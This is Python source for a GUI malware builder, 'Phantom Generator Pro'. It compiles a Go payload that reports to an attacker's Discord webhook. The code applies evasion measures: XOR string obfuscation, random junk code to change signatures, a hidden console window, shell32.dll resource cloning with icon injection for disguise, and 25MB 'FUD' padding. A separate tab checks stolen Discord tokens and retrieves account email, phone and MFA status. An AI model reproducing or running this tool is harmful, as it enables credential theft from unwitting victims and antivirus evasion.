import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import os
import subprocess
import sys
import base64
import threading
import re
import random
import string
import shutil

def install_dependencies():
    """Checks and installs required python modules"""
    required = ["requests"]
    for package in required:
        try:
            __import__(package)
        except ImportError:
            print(f"Installing {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Auto-install dependencies before sensitive imports
install_dependencies()

# Now it's safe to import requests
import requests
from resource_injector import inject_icon, clone_resources

class Phantom:
    def __init__(self, root):
        self.root = root
        self.root.title("Phantom Generator Pro")
        self.root.geometry("750x700")
        self.root.configure(bg="#0f0f12")
        self.root.resizable(False, False)
        
        # Colors & Styles
        self.colors = {
            "bg": "#0f0f12",
            "panel": "#1a1a1f",
            "accent": "#00a8ff",
            "text": "#ffffff",
            "text_dim": "#a0a0a5",
            "border": "#16161b",
            "success": "#2ecc71",
            "warning": "#f1c40f",
            "danger": "#e74c3c"
        }

        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Configure Ttk Styles
        self.style.configure("TFrame", background=self.colors["bg"], borderwidth=0, relief="flat")
        self.style.configure("Panel.TFrame", background=self.colors["panel"], borderwidth=0, relief="flat")
        
        self.style.configure("TLabel", background=self.colors["bg"], foreground=self.colors["text"], font=("Segoe UI", 10))
        self.style.configure("Panel.TLabel", background=self.colors["panel"], foreground=self.colors["text"], font=("Segoe UI", 10))
        self.style.configure("Header.TLabel", background=self.colors["bg"], foreground=self.colors["accent"], font=("Segoe UI", 22, "bold"))
        self.style.configure("Section.TLabel", background=self.colors["panel"], foreground=self.colors["accent"], font=("Segoe UI", 11, "bold"))
        
        self.style.configure("TEntry", fieldbackground=self.colors["bg"], foreground=self.colors["text"], borderwidth=0)
        
        self.style.configure("Action.TButton", font=("Segoe UI", 10, "bold"), padding=10)
        self.style.map("Action.TButton",
            background=[('active', self.colors["accent"]), ('!disabled', self.colors["panel"])],
            foreground=[('active', "#ffffff"), ('!disabled', self.colors["text"])]
        )

        self.style.configure("Generate.TButton", font=("Segoe UI", 12, "bold"), background=self.colors["accent"], foreground="#ffffff")
        self.style.map("Generate.TButton", background=[('active', "#0086cc")])

        # Notebook Styles
        self.style.configure("TNotebook", background=self.colors["bg"], borderwidth=0, 
                             lightcolor=self.colors["bg"], bordercolor=self.colors["bg"])
        self.style.configure("TNotebook.Tab", background=self.colors["panel"], foreground=self.colors["text_dim"], 
                             padding=[15, 8], font=("Segoe UI", 9, "bold"), borderwidth=0,
                             lightcolor=self.colors["panel"], bordercolor=self.colors["panel"])
        self.style.map("TNotebook.Tab",
            background=[("selected", self.colors["accent"]), ("active", self.colors["panel"])],
            foreground=[("selected", "#ffffff"), ("active", self.colors["text"])],
            padding=[("selected", [15, 8])],
            lightcolor=[("selected", self.colors["accent"])],
            bordercolor=[("selected", self.colors["accent"])]
        )

        # Initialize attributes
        self.destination = None
        self.icon_path = None
        self.go_executable = self._find_go_executable()

        self._build_ui()

    def _build_ui(self):
        # Main Outer Container (No border as requested)
        outer_frame = tk.Frame(self.root, bg=self.colors["bg"])
        outer_frame.pack(fill=tk.BOTH, expand=True)
        
        inner_bg = tk.Frame(outer_frame, bg=self.colors["bg"])
        inner_bg.pack(fill=tk.BOTH, expand=True)

        # Create Notebook for Tabs
        self.notebook = ttk.Notebook(inner_bg)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        # --- TAB 1: GENERATOR ---
        self.gen_tab = ttk.Frame(self.notebook, padding="30")
        self.notebook.add(self.gen_tab, text="🚀 BUILDER")
        
        container = self.gen_tab

        # Title Section
        title_frame = ttk.Frame(container)
        title_frame.pack(fill=tk.X, pady=(0, 25))
        
        header = ttk.Label(title_frame, text="PHANTOM", style="Header.TLabel")
        header.pack(side=tk.LEFT)
        
        version = ttk.Label(title_frame, text="V2.1 PRO EDITION", font=("Segoe UI", 9, "bold"), foreground=self.colors["text_dim"])
        version.pack(side=tk.LEFT, padx=10, pady=(10, 0))

        # --- CONFIGURATION PANEL ---
        config_panel = ttk.Frame(container, style="Panel.TFrame", padding=20)
        config_panel.pack(fill=tk.BOTH, expand=True)

        # Webhook
        webhook_frame = ttk.Frame(config_panel, style="Panel.TFrame")
        webhook_frame.pack(fill=tk.X)
        self._create_input_section(webhook_frame, "Discord Webhook URL", "Paste your webhook here...", "url_entry")
        
        self.test_webhook_btn = tk.Button(webhook_frame, text="TEST WEBHOOK", command=self.test_webhook,
                                         bg=self.colors["bg"], fg=self.colors["accent"], font=("Segoe UI", 8, "bold"),
                                         activebackground=self.colors["bg"], activeforeground="#0086cc",
                                         bd=0, cursor="hand2", padx=10)
        self.test_webhook_btn.pack(anchor=tk.E, pady=(0, 5))
        
        # EXE Name
        self._create_input_section(config_panel, "Output File Name", "payload.exe", "exe_entry", default="phantom_payload.exe")

        # Two Columns for Options
        options_grid = ttk.Frame(config_panel, style="Panel.TFrame")
        options_grid.pack(fill=tk.X, pady=15)
        options_grid.columnconfigure(0, weight=1)
        options_grid.columnconfigure(1, weight=1)

        # Column 1: Mode Selection
        mode_section = ttk.Frame(options_grid, style="Panel.TFrame")
        mode_section.grid(row=0, column=0, sticky="nw", padx=(0, 10))
        
        ttk.Label(mode_section, text="PAYLOAD MODE", style="Section.TLabel").pack(anchor=tk.W, pady=(0, 10))
        
        self.mode_var = tk.StringVar(value="None")
        modes = [("Normal EXE", "None")]
        
        for text, value in modes:
            rb = tk.Radiobutton(mode_section, text=text, variable=self.mode_var, value=value,
                                 bg=self.colors["panel"], 
                                 fg=self.colors["text"], selectcolor=self.colors["bg"],
                                 activebackground=self.colors["panel"], activeforeground=self.colors["accent"],
                                 font=("Segoe UI", 9), bd=0, highlightthickness=0)
            rb.pack(anchor=tk.W, pady=2)

        # Column 2: Stealth Options
        stealth_section = ttk.Frame(options_grid, style="Panel.TFrame")
        stealth_section.grid(row=0, column=1, sticky="nw", padx=(10, 0))
        
        ttk.Label(stealth_section, text="STEALTH SETTINGS", style="Section.TLabel").pack(anchor=tk.W, pady=(0, 10))
        
        self.fud_var = tk.BooleanVar(value=True)
        self._create_modern_check(stealth_section, "FUD Padding (25MB)", self.fud_var)

        # --- ASSETS SECTION ---
        assets_frame = ttk.Frame(config_panel, style="Panel.TFrame")
        assets_frame.pack(fill=tk.X, pady=15)
        
        # Buttons Row
        btns_row = ttk.Frame(assets_frame, style="Panel.TFrame")
        btns_row.pack(fill=tk.X)

        self.destination_button = ttk.Button(btns_row, text="📁 DESTINATION", style="Action.TButton", command=self.select_destination)
        self.destination_button.pack(side=tk.LEFT, padx=(0, 5), expand=True, fill=tk.X)

        self.icon_button = ttk.Button(btns_row, text="🖼️ CUSTOM ICON", style="Action.TButton", command=self.select_icon)
        self.icon_button.pack(side=tk.LEFT, padx=(5, 0), expand=True, fill=tk.X)

        # Asset Labels
        labels_row = ttk.Frame(assets_frame, style="Panel.TFrame", padding=(0, 10))
        labels_row.pack(fill=tk.X)
        
        self.dest_label = ttk.Label(labels_row, text="📍 No destination set", style="Panel.TLabel", font=("Segoe UI", 8), foreground=self.colors["text_dim"])
        self.dest_label.pack(anchor=tk.W)
        self.icon_label = ttk.Label(labels_row, text="🖼️ No icon selected", style="Panel.TLabel", font=("Segoe UI", 8), foreground=self.colors["text_dim"])
        self.icon_label.pack(anchor=tk.W)

        # --- GENERATE SECTION ---
        gen_frame = ttk.Frame(container)
        gen_frame.pack(fill=tk.X, pady=(25, 0))

        self.generate_button = tk.Button(gen_frame, text="BUILD PAYLOAD", command=self.generate_malware,
                                         bg=self.colors["accent"], fg="#ffffff", font=("Segoe UI", 12, "bold"),
                                         activebackground="#0086cc", activeforeground="#ffffff",
                                         bd=0, cursor="hand2", pady=12)
        self.generate_button.pack(fill=tk.X)

        # Progress & Status
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(container, variable=self.progress_var, maximum=100)
        self.progress_bar.pack(fill=tk.X, pady=(20, 10))
        
        self.status_label = ttk.Label(container, text="Ready for deployment", font=("Segoe UI", 9, "italic"), foreground=self.colors["text_dim"])
        self.status_label.pack()

        # --- TAB 2: TOOLBOX ---
        self.tool_tab = ttk.Frame(self.notebook, padding="30")
        self.notebook.add(self.tool_tab, text="🛠️ TOOLBOX")
        self._build_toolbox_ui()

        # --- TAB 3: VERIFIER ---
        self.verify_tab = ttk.Frame(self.notebook, padding="30")
        self.notebook.add(self.verify_tab, text="✅ VERIFIER")
        self._build_verifier_ui()

    def _build_verifier_ui(self):
        container = self.verify_tab
        
        # Title Section (Unified Style)
        title_frame = ttk.Frame(container)
        title_frame.pack(fill=tk.X, pady=(0, 25))
        
        header = ttk.Label(title_frame, text="VERIFIER", style="Header.TLabel")
        header.pack(side=tk.LEFT)

        # Main Panel
        verify_panel = ttk.Frame(container, style="Panel.TFrame", padding=20)
        verify_panel.pack(fill=tk.BOTH, expand=True)

        description = ttk.Label(verify_panel, text="Check if a Discord token is valid and retrieve user information.", 
                                foreground=self.colors["text_dim"], font=("Segoe UI", 9))
        description.pack(anchor=tk.W, pady=(0, 20))

        # Input Area
        self._create_input_section(verify_panel, "Discord Token", "Paste token to verify...", "token_verify_entry")
        
        # Verify Button
        self.token_verify_btn = tk.Button(verify_panel, text="VERIFY TOKEN", command=self.start_token_verification,
                                         bg=self.colors["accent"], fg="#ffffff", font=("Segoe UI", 10, "bold"),
                                         activebackground="#0086cc", activeforeground="#ffffff",
                                         bd=0, cursor="hand2", pady=10)
        self.token_verify_btn.pack(fill=tk.X, pady=10)

        # Result Display Area (Inside the same panel for consistency)
        ttk.Label(verify_panel, text="STATUS", style="Section.TLabel").pack(anchor=tk.W, pady=(20, 5))
        
        # Indicator light and label
        status_row = ttk.Frame(verify_panel, style="Panel.TFrame")
        status_row.pack(fill=tk.X, pady=(0, 15))
        
        self.verify_indicator = tk.Canvas(status_row, width=16, height=16, bg=self.colors["panel"], highlightthickness=0)
        self.verify_indicator.pack(side=tk.LEFT)
        self.verify_light = self.verify_indicator.create_oval(2, 2, 14, 14, fill=self.colors["text_dim"])
        
        self.verify_status_label = ttk.Label(status_row, text="IDLE", font=("Segoe UI", 10, "bold"), foreground=self.colors["text_dim"])
        self.verify_status_label.pack(side=tk.LEFT, padx=10)

        # Info Text
        ttk.Label(verify_panel, text="ACCOUNT INFO", style="Section.TLabel").pack(anchor=tk.W, pady=(0, 5))
        self.verify_output_text = tk.Text(verify_panel, bg=self.colors["bg"], fg=self.colors["text"],
                                         font=("Consolas", 9), bd=0, highlightthickness=0, height=8)
        self.verify_output_text.pack(fill=tk.BOTH, expand=True, pady=5)

    def set_verify_status(self, text, color_hex):
        self.verify_status_label.config(text=text, foreground=color_hex)
        self.verify_indicator.itemconfig(self.verify_light, fill=color_hex)

    def start_token_verification(self):
        token = self.token_verify_entry.get().strip()
        if not token:
            messagebox.showwarning("Warning", "Please enter a token to verify.")
            return

        # Basic format check (simplified)
        if not re.match(r"^[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+$", token) and not token.startswith("mfa."):
             self.set_verify_status("INVALID FORMAT", self.colors["error"])
             self.verify_output_text.delete(1.0, tk.END)
             return

        self.token_verify_btn.config(state=tk.DISABLED, text="VERIFYING...")
        self.set_verify_status("CHECKING...", self.colors["accent"])
        self.verify_output_text.delete(1.0, tk.END)
        
        threading.Thread(target=self.run_token_check, args=(token,), daemon=True).start()

    def run_token_check(self, token):
        headers = {"Authorization": token, "Content-Type": "application/json"}
        try:
            response = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                username = f"{data['username']}"
                if data.get('discriminator') != "0":
                    username += f"#{data['discriminator']}"
                
                info = [
                    f"User:     {username}",
                    f"ID:       {data['id']}",
                    f"Email:    {data.get('email', 'N/A')}",
                    f"Phone:    {data.get('phone', 'N/A')}",
                    f"MFA:      {'Enabled' if data.get('mfa_enabled') else 'Disabled'}",
                    f"Nitro:    {'Yes' if data.get('premium_type', 0) > 0 else 'No'}",
                    f"Flags:    {data.get('public_flags', 0)}"
                ]
                
                self.root.after(0, lambda: self.show_verify_result("VALID TOKEN", self.colors["success"], "\n".join(info)))
            else:
                self.root.after(0, lambda: self.show_verify_result("INVALID TOKEN", self.colors["error"], "The token is expired or incorrect."))
        except Exception as e:
            self.root.after(0, lambda: self.show_verify_result("ERROR", self.colors["error"], f"Connection error: {str(e)}"))

    def show_verify_result(self, status_text, color, info_text):
        self.token_verify_btn.config(state=tk.NORMAL, text="VERIFY TOKEN")
        self.set_verify_status(status_text, color)
        self.verify_output_text.delete(1.0, tk.END)
        self.verify_output_text.insert(tk.END, info_text)

    def _build_toolbox_ui(self):
        container = self.tool_tab
        
        # Title Section (Unified Style)
        title_frame = ttk.Frame(container)
        title_frame.pack(fill=tk.X, pady=(0, 25))
        
        header = ttk.Label(title_frame, text="OBFUSCATOR", style="Header.TLabel")
        header.pack(side=tk.LEFT)
        
        # Main Panel
        tool_panel = ttk.Frame(container, style="Panel.TFrame", padding=20)
        tool_panel.pack(fill=tk.BOTH, expand=True)

        description = ttk.Label(tool_panel, text="Use this tool to encrypt/decrypt strings for the payload (XOR 0x50).", 
                                foreground=self.colors["text_dim"], font=("Segoe UI", 9))
        description.pack(anchor=tk.W, pady=(0, 20))

        # Input Area
        self._create_input_section(tool_panel, "Input Text", "Enter text to process...", "tool_input_entry")
        
        # Action Buttons
        btns_row = ttk.Frame(tool_panel, style="Panel.TFrame")
        btns_row.pack(fill=tk.X, pady=10)

        obf_btn = tk.Button(btns_row, text="OBFUSCATE", command=self.tool_obfuscate,
                             bg=self.colors["accent"], fg="#ffffff", font=("Segoe UI", 10, "bold"),
                             activebackground="#0086cc", activeforeground="#ffffff",
                             bd=0, cursor="hand2", padx=20, pady=8)
        obf_btn.pack(side=tk.LEFT, padx=(0, 10))

        deobf_btn = tk.Button(btns_row, text="DEOBFUSCATE", command=self.tool_deobfuscate,
                               bg=self.colors["bg"], fg=self.colors["text"], font=("Segoe UI", 10, "bold"),
                               activebackground=self.colors["panel"], activeforeground=self.colors["accent"],
                               bd=0, cursor="hand2", padx=20, pady=8)
        deobf_btn.pack(side=tk.LEFT)

        # Output Area
        ttk.Label(tool_panel, text="RESULT", style="Section.TLabel").pack(anchor=tk.W, pady=(20, 10))
        
        self.tool_output_text = tk.Text(tool_panel, bg=self.colors["bg"], fg=self.colors["success"],
                                       font=("Consolas", 10), bd=0, highlightthickness=0, height=8)
        self.tool_output_text.pack(fill=tk.BOTH, expand=True, pady=5)

    def tool_obfuscate(self):
        text = self.tool_input_entry.get().strip()
        if not text: return
        
        # XOR with 0x50
        xor_key = 0x50
        data = bytearray(text, 'utf-8')
        res = bytearray()
        for b in data:
            res.append(b ^ xor_key)
        
        # Base64 encode
        encoded = base64.b64encode(res).decode('utf-8')
        
        self.tool_output_text.delete(1.0, tk.END)
        self.tool_output_text.insert(tk.END, encoded)

    def tool_deobfuscate(self):
        text = self.tool_input_entry.get().strip()
        if not text: return
        
        try:
            # Base64 decode
            decoded = base64.b64decode(text)
            
            # XOR with 0x50
            xor_key = 0x50
            res = bytearray()
            for b in decoded:
                res.append(b ^ xor_key)
            
            result = res.decode('utf-8')
            
            self.tool_output_text.delete(1.0, tk.END)
            self.tool_output_text.insert(tk.END, result)
        except Exception as e:
            messagebox.showerror("Error", f"Invalid obfuscated string: {str(e)}")

    def _create_input_section(self, parent, label, placeholder, attr_name, default=""):
        frame = ttk.Frame(parent, style="Panel.TFrame")
        frame.pack(fill=tk.X, pady=10)
        
        ttk.Label(frame, text=label.upper(), style="Section.TLabel").pack(anchor=tk.W, pady=(0, 5))
        
        entry_container = tk.Frame(frame, bg=self.colors["bg"], padx=10, pady=8)
        entry_container.pack(fill=tk.X)
        
        entry = tk.Entry(entry_container, bg=self.colors["bg"], fg=self.colors["text"],
                         insertbackground=self.colors["text"], font=("Segoe UI", 10),
                         bd=0, highlightthickness=0)
        entry.pack(fill=tk.X)
        if default: entry.insert(0, default)
        setattr(self, attr_name, entry)

    def _create_modern_check(self, parent, text, var):
        cb = tk.Checkbutton(parent, text=text, variable=var, bg=self.colors["panel"],
                            fg=self.colors["text"], selectcolor=self.colors["bg"],
                            activebackground=self.colors["panel"], activeforeground=self.colors["accent"],
                            font=("Segoe UI", 9), bd=0, highlightthickness=0)
        cb.pack(anchor=tk.W, pady=2)

    def _generate_junk_code(self):
        """Generates random Go junk functions to change file signature"""
        junk = ""
        for _ in range(random.randint(5, 10)):
            func_name = "".join(random.choices(string.ascii_letters, k=random.randint(8, 16)))
            junk += f"\nfunc {func_name}() {{\n"
            # Random logic that doesn't do much but looks real
            ops = [
                f"\ta := {random.randint(1, 1000)}\n\tb := {random.randint(1, 1000)}\n\tif a > b {{ a = a - b }}\n",
                f"\ts := \"{''.join(random.choices(string.ascii_letters, k=10))}\"\n\tif len(s) > 5 {{ s = s[:5] }}\n",
                f"\tfor i := 0; i < {random.randint(10, 50)}; i++ {{ junk() }}\n"
            ]
            junk += random.choice(ops)
            junk += "}\n"
        return junk

    def _obfuscate_go_source(self, source_path, webhook_url):
        """Applies polymorphism: random XOR key and junk code"""
        with open(source_path, 'r', encoding='utf-8') as f:
            content = f.read()

        # 1. Generate random XOR key (0x10 to 0x7F)
        xor_key = random.randint(0x10, 0x7F)
        
        # 2. Update the key in the 'd' function in main.go
        # Expected line: key := byte(0x50) // PHANTOM KEY
        content = re.sub(r'key := byte\(0x[0-9a-fA-F]+\)', f'key := byte({hex(xor_key)})', content)

        # 3. Encrypt the webhook URL with the NEW key
        def xor_encrypt(text, key):
            res = bytearray()
            for b in text.encode('utf-8'):
                res.append(b ^ key)
            return base64.b64encode(res).decode('utf-8')

        obfuscated_webhook = xor_encrypt(webhook_url, xor_key)

        # 4. Find all O("string") and replace with d("obfuscated")
        def replace_o(match):
            original_string = match.group(1)
            # Unescape backslashes for proper encryption
            unescaped = original_string.encode().decode('unicode_escape')
            obfuscated = xor_encrypt(unescaped, xor_key)
            return f'd("{obfuscated}")'

        content = re.sub(r'O\("((?:\\.|[^"\\])*)"\)', replace_o, content)

        # 5. Add junk code at the end
        junk = self._generate_junk_code()
        content += "\n" + junk

        # 5. Add random comments throughout the file to change hash
        lines = content.split('\n')
        for _ in range(15):
            idx = random.randint(0, len(lines)-1)
            comment = "// " + "".join(random.choices(string.ascii_letters + "0123456789 ", k=40))
            lines.insert(idx, comment)
        
        return "\n".join(lines), obfuscated_webhook
    
    def _find_go_executable(self):
        """Find the Go executable in the system"""
        # 1. Try common locations
        possible_paths = [
            os.path.join(os.environ.get("ProgramFiles", "C:\\Program Files"), "Go", "bin", "go.exe"),
            "C:\\go\\bin\\go.exe",
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                return path
        
        # 2. Try from PATH using 'where' or 'which'
        try:
            cmd = "where" if os.name == "nt" else "which"
            result = subprocess.run([cmd, "go"], capture_output=True, text=True, check=True)
            return result.stdout.strip().split('\n')[0]
        except:
            return None

    def select_destination(self):
        self.destination = filedialog.askdirectory()
        if self.destination:
            self.dest_label.config(text=f"📍 {os.path.abspath(self.destination)}")

    def select_icon(self):
        self.icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
        if self.icon_path:
            self.icon_label.config(text=f"🖼️ {os.path.basename(self.icon_path)}")

    def test_webhook(self):
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showwarning("Warning", "Please enter a Webhook URL first")
            return
        
        if "discord.com/api/webhooks/" not in url and "discordapp.com/api/webhooks/" not in url:
            messagebox.showwarning("Warning", "Invalid Webhook URL format")
            return

        try:
            payload = {
                "embeds": [{
                    "title": "✅ Phantom Connection Test",
                    "description": "Your webhook is correctly configured and receiving messages!",
                    "color": 0x00A2ED,
                    "footer": {"text": "Phantom V2.1 PRO EDITION"}
                }]
            }
            response = requests.post(url, json=payload, timeout=10)
            if response.status_code in [200, 204]:
                messagebox.showinfo("Success", "Test message sent successfully! Check your Discord channel.")
            else:
                messagebox.showerror("Error", f"Failed to send test message. Status code: {response.status_code}\nResponse: {response.text}")
        except Exception as e:
            messagebox.showerror("Error", f"Connection error: {str(e)}")

    def generate_malware(self):
        url = self.url_entry.get().strip()
        exe_name = self.exe_entry.get().strip()
        
        if not url:
            messagebox.showwarning("Warning", "Please enter a Webhook URL")
            return
        
        # Relaxed validation: just check if it contains the webhook part
        if "discord.com/api/webhooks/" not in url and "discordapp.com/api/webhooks/" not in url:
            messagebox.showwarning("Warning", "Invalid Webhook URL. It should be a Discord webhook link.")
            return

        if not self.destination:
            messagebox.showwarning("Warning", "Please select a destination folder")
            return
        
        if not self.go_executable:
            messagebox.showerror("Error", "Go (Golang) not found on your system.\nPlease install it from https://go.dev/")
            return
        
        if not exe_name.endswith('.exe'):
            exe_name += '.exe'
        
        try:
            self.generate_button.config(state=tk.DISABLED)
            self.status_label.config(text="Initializing...")
            self.progress_var.set(5)
            self.root.update()
            
            script_dir = os.path.dirname(os.path.abspath(__file__))
            go_payload_dir = os.path.join(script_dir, "go_payload")
            main_go_path = os.path.join(go_payload_dir, "main.go")
            temp_main_go = os.path.join(go_payload_dir, f"build_{random.randint(1000, 9999)}.go")
            output_exe = os.path.join(self.destination, exe_name)
            
            if not os.path.exists(main_go_path):
                messagebox.showerror("Error", "Source files missing in 'go_payload' directory")
                return
            
            self.status_label.config(text="Applying polymorphism & obfuscation...")
            self.progress_var.set(20)
            self.root.update()

            # Apply polymorphism and get obfuscated webhook
            new_source, final_webhook = self._obfuscate_go_source(main_go_path, url)
            with open(temp_main_go, 'w', encoding='utf-8') as f:
                f.write(new_source)
            
            self.status_label.config(text="Preparing build environment...")
            self.progress_var.set(30)
            self.root.update()
            
            # Compile Go code
            timestamp = str(__import__('datetime').datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
            
            # ldflags: -s -w (reduce size), -H=windowsgui (no console window)
            ldflags = f"-s -w -H=windowsgui -X \"main.WebhookURL={final_webhook}\" -X \"main.Timestamp={timestamp}\""
            
            self.status_label.config(text="Compiling binary (Go)...")
            self.progress_var.set(50)
            self.root.update()

            build_cmd = [
                self.go_executable, "build",
                "-o", output_exe,
                "-ldflags", ldflags,
                os.path.basename(temp_main_go)
            ]
            
            result = subprocess.run(build_cmd, check=True, cwd=go_payload_dir, 
                                 capture_output=True, text=True)
            
            # Cleanup temp source
            try:
                os.remove(temp_main_go)
            except:
                pass
            
            # Inject icon & Metadata
            target_file_for_meta = None
            if self.icon_path:
                # Use shell32.dll as a template to ensure the binary has a resource section
                target_file_for_meta = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "shell32.dll")
            
            # Priority 1: User selected icon
            final_icon = self.icon_path
            temp_icon_path = None

            # 1. First, clone metadata if a target is available
            if target_file_for_meta and os.path.exists(target_file_for_meta):
                self.status_label.config(text="Preparing resource section...")
                self.progress_var.set(70)
                self.root.update()
                try:
                    # Clone basic resources first
                    clone_resources(target_file_for_meta, output_exe)
                except Exception as e:
                    print(f"Warning: Metadata cloning failed: {e}")
            
            # 2. Then, inject our specific icon (this overwrites any icon from cloning)
            if final_icon and os.path.exists(final_icon):
                self.status_label.config(text="Injecting final icon...")
                success = inject_icon(output_exe, final_icon)
                if not success:
                    messagebox.showwarning("Icon Warning", "Failed to inject the custom icon. The payload will still work, but without the icon.")
                    self.status_label.config(text="Icon injection failed!")
            
            # FUD Optimization (Padding)
            if self.fud_var.get():
                self.status_label.config(text="Applying FUD optimizations...")
                self.progress_var.set(80)
                self.root.update()
                try:
                    with open(output_exe, "ab") as f:
                        f.write(os.urandom(25 * 1024 * 1024)) # Add 25MB padding
                except:
                    pass

            self.status_label.config(text="Payload ready!")
            self.progress_var.set(100)
            self.root.update()
            
            messagebox.showinfo("Success", f"Payload generated successfully!\n\nLocation: {output_exe}")
            
        except subprocess.CalledProcessError as e:
            error_msg = e.stderr if e.stderr else str(e)
            messagebox.showerror("Build Error", f"Compilation failed:\n{error_msg}")
        except Exception as e:
            messagebox.showerror("Error", f"An unexpected error occurred:\n{str(e)}")
        finally:
            self.generate_button.config(state=tk.NORMAL)
            self.status_label.config(text="Ready")
            self.progress_var.set(0)

if __name__ == "__main__":
    root = tk.Tk()
    app = Phantom(root)
    root.mainloop()
